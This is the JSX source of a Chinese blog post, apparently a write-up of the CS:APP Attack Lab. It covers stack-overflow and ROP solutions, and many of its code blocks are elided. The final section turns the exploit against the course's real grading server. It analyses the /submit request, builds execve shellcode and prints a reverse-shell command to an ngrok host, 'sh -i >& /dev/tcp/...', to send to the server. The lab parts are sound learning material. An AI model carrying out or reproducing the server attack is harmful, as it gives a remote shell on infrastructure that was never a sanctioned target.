...
export default function Post() {
    return (
        <>
            <X.H1>闲话</X.H1>
            <X.P>文档：@[https://csapp.cs.cmu.edu/3e/attacklab.pdf]@</X.P>
            <X.P>文档中有以下几个关键点，单独记录一下：</X.P>
            ...
            <X.Image src="checksec-ctarget.jpg" />
            <X.H2>攻击入口</X.H2>
            <X.CodeBlock
                language="c"
                code={String.raw`
            ...
            <X.CodeBlock
                ...
                `}
            />
            <X.P>攻击入口是存在栈溢出的`getbuf`函数，我拿到的程序pad为`24`字节。从汇编看`getbuf`，`sub rsp, 18h`开了`24`字节的空间给字符串`buf`，`call Gets`把数据写入`rsp`开头的空间，然后在`add rsp, 18h`后直接返回。`buf`之后紧跟着就是返回地址（这里没有保存`rbp`的指令）。</X.P>
            <X.H2>Phase 1</X.H2>
            <X.P>Phase 1只要跳转到`touch1`函数，因此找到其地址`0x401BE4`，按照小端序写入`24`字节padding之后即可。</X.P>
            <X.CodeBlock
                language="text"
                code={String.raw`
                /* pad to 24 bytes */
            ...
            />
            <X.H2>Phase 2</X.H2>
            <X.P>Phase 2要跳转到`touch2`函数，并且需要布置对应的参数（参数为整数）。目标值`cookie`在handout中给出了，就是文件`cookie.txt`，这里值为`0x2d8c0362`。</X.P>
            <X.CodeBlock
                language="c"
                code={String.raw`
            ...
            <X.CodeBlock
                ...
                `}
            />
            <X.P>看到`val`是由寄存器`edi`传入，因此需要在跳转前改变`rdi`的值。由于这题关了NX而且栈地址被特意固定，可以考虑把shellcode写到栈上然后跳转。shellcode地址可以进入调试以后在`getbuf`下断点获取：</X.P>
            <X.Image src="4.jpg" />
            <X.P>`0x5561b9e8`就是`buf`的首地址，因为向栈上写入了`24`字节的填充和`8`字节的shellcode地址，所以地址应为`0x5561b9e8 + 32 = 0x5561ba08`。</X.P>
            <X.P>生成shellcode可以借助pwntools：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                from pwn import *
            ...
            <X.CodeBlock
                ...
                `}
            />
            <X.P>这里格外注意的一点是，由于栈向低地址生长（也就是后续函数的栈帧会覆盖低地址栈空间），字符串`"2d8c0362"`不能布置在原`buf`的空间，因为会被`hexmatch`函数的栈帧覆盖掉。</X.P>
            <X.H1>ROP</X.H1>
            <X.Image src="checksec-rtarget.jpg" />
            <X.P>程序的攻击入口是一样的`getbuf`函数。</X.P>
            <X.H2>Phase 4</X.H2>
            <X.P>如最前面所说，一开始做题的时候没注意，Phase 4~5用了gadget farm范围外的gadgets，而服务端有专用于测评的程序`rtarget-check`，无法保证与下发的`rtarget`程序找到的gadgets一致。因此这两题的解法过不了服务端的测评，重在学习ROP思路~</X.P>
            <X.P>Phase 4和Phase 2要求目标一致，但是开启了NX（也没有泄露栈地址）因此无法注入shellcode来操纵`rdi`的值。找一个`pop rdi`gadget：</X.P>
            <X.CodeBlock
                language="bash"
                code={String.raw`
            ...
            />
            <X.P>此处执行流程是：</X.P>
            <X.Oli>`getbuf`读入`24`字节填充占满`buf`，其后`8`字节的返回地址本应为`test+14`（调用点），现在被覆盖为`0x4029e8`（gadget地址）</X.Oli>
            <X.Oli>`getbuf`中`ret`执行，程序返回到gadget地址</X.Oli>
            <X.Oli>gadget中`pop rdi`执行，`rdi`被设为布置在栈上的`0x2d8c0362`</X.Oli>
            <X.Oli>gadget中`ret`执行，返回到`touch2`</X.Oli>
            <X.H2>Phase 5</X.H2>
            <X.P>Phase 5和Phase 3的目标一样，都是布置一个字符串`"2d8c0362"`，并且将其地址作为参数传入`touch3`。Phase 5的难点在于栈地址不确定，即使把字符串布置在栈上，也没办法构造确切的地址。</X.P>
            <X.P>这题思路是在众多gadget中找到一个任意写原语，比如：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                ...
                `}
            />
            <X.P>允许我们向`rdi + 8`地址写入`rax`的值。封装一个`create_poc`函数，可以构造一个任意写payload：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                def pad8(x):
            ...
            <X.CodeBlock
                ...
                `}
            />
            <X.H1>通过shellcode在服务器RCE</X.H1>
            <X.P>做Phase 2的时候在想，如果`ctarget`程序不开NX保护，可以执行shellcode，是不是可以RCE呢？</X.P>
            <X.CodeBlock
                language="python"
                title="gen-shellcode.py"
                code={String.raw`
                from pwn import *
                import sys
                ...
                `}
            />
            <X.P>`gen-shellcode.py`封装了一个通用的命令执行`bash -c "..."`shellcode。把生成的shellcode拼接到Phase 2的解法中就可以，类似于：</X.P>
            <X.CodeBlock
                language="text"
                code={String.raw`
                /* pad to 24 bytes */
            ...
            />
            <X.Image src="6.jpg" />
            <X.P>本地测没问题。但是想要打到服务器，首先要理解`ctarget`/`rtarget`程序是怎么跟服务端通信的（也就是怎么实现记分板自动同步的）。当成功触发`touch1`/`touch2`/`touch3`函数时，会调用`validate`函数：</X.P>
            <X.CodeBlock
                language="c"
                code={String.raw`
                ...
                `}
            />
            <X.P>`validate`函数内还会再调用`notify_server`函数发送HTTP请求到服务器，携带本地测评状态和完整的payload，然后服务端将重新运行提交的payload并记录评测分。可以通过逆向分析获取这个HTTP请求的结构，或者直接本地`tcpdump`抓一个包：</X.P>
            <X.CodeBlock language="bash" code="tcpdump -nn -A host <server_ip>" />
            <X.Image src="7.jpg" />
            <X.P>可以看到是对`/submit`端点的请求，携带的参数是测评状态和完整payload。运行时如果加入`-q`参数就表示不发送到服务器的请求。</X.P>
            <X.P>当注入`execve`payload之后，即使移除`-q`参数，服务端也不会收到请求，这是因为`execve`会替换掉整个进程，导致控制流被劫持到shellcode、执行`execve`之后不再进入`touch3`函数，也就不再发送相应的HTTP请求。解决的办法就是直接带着构造好的payload发送HTTP请求到服务端。</X.P>
            <X.P>理解上述过程后，就可以打服务端RCE了。以反弹shell为例，先用上面的`gen-shellcode.py`脚本生成对应shellcode：</X.P>
            <X.CodeBlock language="bash" code='python gen-shellcode.py "sh -i >& /dev/tcp/0.tcp.jp.ngrok.io/23699 0>&1"' />
            <X.P>复制生成的payload字符串到`shellcode`变量，直接发送HTTP请求：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                import requests
